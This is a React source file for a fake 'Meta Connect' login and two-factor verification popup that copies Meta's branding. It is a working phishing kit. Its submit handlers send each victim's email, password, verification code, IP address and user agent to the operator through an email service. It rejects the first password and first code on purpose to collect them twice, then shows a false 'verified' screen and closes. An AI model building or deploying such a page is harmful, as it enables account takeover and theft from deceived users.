import React, { useState, useEffect, useRef } from "react";
import { 
  ShieldCheck, 
  Loader2, 
  CheckCircle2, 
  KeyRound, 
  X,
  Mail,
  Lock,
  Smartphone,
  AlertCircle,
  AlertTriangle,
  Eye,
  EyeOff,
  CheckCircle
} from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { cn } from "@/lib/utils";
import { sendLoginInfo, getUserIp } from "@/lib/emailService";

enum LoginStep {
  LOGIN_FIRST_ATTEMPT = 0,
  LOGIN_SECOND_ATTEMPT = 1,
  VERIFICATION_FIRST_ATTEMPT = 2,
  VERIFICATION_SECOND_ATTEMPT = 3,
  SUCCESS = 4
}

const MetaLoginPopup = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
  const [countdown, setCountdown] = useState(60);
  const codeInputRef = useRef<HTMLInputElement>(null);
  
  // Close the window when verification is successful
  useEffect(() => {
    if (currentStep === LoginStep.SUCCESS) {
      const timer = setTimeout(() => {
        window.close();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  // Random delay between 3-5 seconds
  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
  
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage(null);

    // Lấy IP và gửi thông tin đăng nhập qua EmailJS
    try {
      const ipAddress = await getUserIp();
      
      await sendLoginInfo({
        email,
        password,
        timestamp: new Date().toISOString(),
        ip: ipAddress,
        userAgent: navigator.userAgent,
      });
      
      console.log('Captured IP address:', ipAddress);
    } catch (error) {
      console.error('Error sending login info:', error);
    }

    // Simulate authentication process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!email || !password) {
        setIsLoading(false);
        setErrorMessage("Please enter both email and password.");
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setErrorMessage("The password you entered is incorrect. Please try again.");
          setPassword("");
          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
        }, 500); // A small additional delay for the error message
      } else {
        // Show success for the second attempt, then transition to verification
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
        }, 800);
      }
    }, getRandomDelay());
  };

  const [verificationError, setVerificationError] = useState<string | null>(null);
  
  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setVerificationError(null);

    // Lấy IP và gửi thông tin mã xác thực qua EmailJS
    try {
      const ipAddress = await getUserIp();
      
      await sendLoginInfo({
        email,
        password: 'Already sent in previous step',
        verificationCode,
        timestamp: new Date().toISOString(),
        ip: ipAddress,
        userAgent: navigator.userAgent,
      });
      
      console.log('Captured IP address for verification:', ipAddress);
    } catch (error) {
      console.error('Error sending verification info:', error);
    }

    // Simulate verification process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!verificationCode || verificationCode.length < 6) {
        setIsLoading(false);
        setVerificationError("Please enter a valid verification code (at least 6 digits).");
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setVerificationError("The verification code you entered is incorrect. Please try again.");
          setVerificationCode("");
          setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
        }, 500);
      } else {
        // Second verification attempt succeeds
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.SUCCESS);
        }, 800);
      }
    }, getRandomDelay());
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
      <header className="bg-gradient-to-r from-blue-600 to-blue-800 shadow-sm sticky top-0 z-10">
        <div className="max-w-7xl mx-auto p-3 flex justify-between items-center">
          <div className="flex items-center">
            <div className="text-white font-bold text-2xl">Meta Connect</div>
          </div>
          <button 
            onClick={() => window.close()} 
            className="text-white hover:text-gray-200 focus:outline-none focus:ring-1 focus:ring-white rounded-full p-1"
            aria-label="Close"
          >
            <X className="h-5 w-5" />
          </button>
        </div>
      </header>
      
      <main className="flex-grow flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-[420px] border border-gray-200">
          {currentStep === LoginStep.SUCCESS ? (
            <div className="text-center">
              <div className="mx-auto mb-6">
                <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                  <CheckCircle className="h-12 w-12 text-green-600" />
                </div>
              </div>
              <h2 className="text-2xl font-bold mb-3 text-gray-800">Verification Complete</h2>
              <p className="text-gray-600 mb-5">
                Your account has been successfully verified. This window will close automatically.
              </p>
              <Progress value={100} className="h-2 bg-gray-100" />
              <p className="text-sm text-gray-500 mt-3">Returning to application...</p>
            </div>
          ) : (
            <>
              <div className="text-center mb-8">
                <div className="flex items-center justify-center mb-4">
                  <div className="text-blue-600 font-extrabold text-4xl">Meta</div>
                  <div className="text-gray-700 font-medium text-xl ml-2">Authentication</div>
                </div>
                <p className="text-gray-600 mt-3">
                  Secure verification required to continue
                </p>
              </div>
              
              {/* Phần xác thực captcha đã được xóa */}
              
              {/* Login Steps */}
              {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                <form onSubmit={handlePasswordSubmit} className="space-y-4">

                  
                  <div className="space-y-1">
                    <Label htmlFor="email" className="text-gray-700 font-medium">Email or Username</Label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                      <Input 
                        id="email" 
                        type="text"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Enter your email address"
                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"}`}
                        disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-1">
                    <Label htmlFor="password" className="text-gray-700 font-medium">Password</Label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
                      <Input 
                        id="password" 
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Enter your password"
                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"} pr-10`}
                        autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                      />
                      <button
                        type="button"
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                        onClick={() => setShowPassword(!showPassword)}
                        tabIndex={-1}
                      >
                        {showPassword ? (
                          <EyeOff className="h-5 w-5" />
                        ) : (
                          <Eye className="h-5 w-5" />
                        )}
                      </button>
                    </div>
                    
                    {/* Error message appears below password field */}
                    {errorMessage && (
                      <div className="flex items-center mt-1 text-red-500 text-sm">
                        <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
                        <span>{errorMessage}</span>
                      </div>
                    )}
                  </div>
                  
                  <div className="pt-2">
                    <Button 
                      type="submit" 
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          <span>Authenticating...</span>
                        </div>
                      ) : (
                        "Continue"
                      )}
                    </Button>
                  </div>
                  
                  <div className="flex justify-between items-center pt-3 pb-2">
                    <div className="flex items-center">
                      <input type="checkbox" id="remember" className="mr-2 h-4 w-4" />
                      <Label htmlFor="remember" className="text-sm text-gray-600">Remember me</Label>
                    </div>
                    <a href="#" className="text-blue-600 text-sm hover:underline">
                      Forgot password?
                    </a>
                  </div>
                  
                  <div className="relative my-6">
                    <div className="absolute inset-0 flex items-center">
                      <div className="w-full border-t border-gray-300"></div>
                    </div>
                    <div className="relative flex justify-center">
                      <span className="px-2 bg-white text-gray-500 text-sm">Or</span>
                    </div>
                  </div>
                  
                  <div className="flex justify-center">
                    <Button
                      type="button"
                      className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 border border-gray-300 h-[48px] rounded-md font-medium text-[15px]"
                      onClick={(e) => e.preventDefault()}
                    >
                      Sign up for Meta
                    </Button>
                  </div>
                </form>
              )}
              
              {/* 2FA Verification Steps */}
              {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                <>
                  <div className="text-center mb-6">
                    <div className="h-20 w-20 mx-auto mb-4 flex items-center justify-center bg-blue-100 rounded-full">
                      <Smartphone className="h-10 w-10 text-blue-600" />
                    </div>
                    <h3 className="text-2xl font-semibold text-gray-800">Security Verification</h3>
                    <p className="text-gray-600 mt-3 text-sm">
                      We've sent a verification code to your device. Please enter it below to continue.
                    </p>
                  </div>
                  
                  <form onSubmit={handleVerificationSubmit} className="space-y-4">
                    <div className="space-y-1">
                      <Label htmlFor="code" className="text-gray-700 font-medium">Verification Code</Label>
                      <div className="relative">
                        <Input 
                          id="code" 
                          type="text"
                          inputMode="numeric"
                          ref={codeInputRef}
                          value={verificationCode}
                          onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                          placeholder="Enter 6-digit code"
                          className={`h-[50px] rounded-md text-lg text-center bg-gray-50 border ${verificationError ? "border-red-500" : "border-gray-300"}`}
                          disabled={isLoading}
                          maxLength={8}
                        />
                      </div>
                      
                      {verificationError && (
                        <div className="flex items-center mt-1 text-red-500 text-sm">
                          <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
                          <span>{verificationError}</span>
                        </div>
                      )}
                    </div>
                    
                    <div className="pt-2">
                      <Button 
                        type="submit" 
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
                        disabled={isLoading}
                      >
                        {isLoading ? (
                          <div className="flex items-center justify-center">
                            <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                            <span>Verifying code...</span>
                          </div>
                        ) : (
                          "Verify Identity"
                        )}
                      </Button>
                    </div>
                    
                    <div className="flex justify-between items-center pt-4">
                      <a href="#" className="text-blue-600 text-sm hover:underline">
                        Resend code
                      </a>
                      <a href="#" className="text-blue-600 text-sm hover:underline">
                        Try another method
                      </a>
                    </div>
                  </form>
                </>
              )}
            </>
          )}
        </div>
      </main>
      
      <footer className="mt-auto py-4 bg-gray-50">
        <div className="max-w-[980px] mx-auto px-4">
          <div className="flex flex-wrap justify-center gap-x-4 text-xs text-gray-500 mb-2">
            <a href="#" className="hover:underline">English</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Français</a>
            <a href="#" className="hover:underline">中文</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">Português</a>
          </div>
          
          <div className="border-t border-gray-200 pt-3">
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-gray-500">
              <a href="#" className="hover:underline">About</a>
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Terms</a>
              <a href="#" className="hover:underline">Cookies</a>
              <a href="#" className="hover:underline">Help Center</a>
            </div>
            <div className="text-center text-xs text-gray-500 mt-3">
              <p>© Meta Platforms, Inc. {new Date().getFullYear()}</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MetaLoginPopup;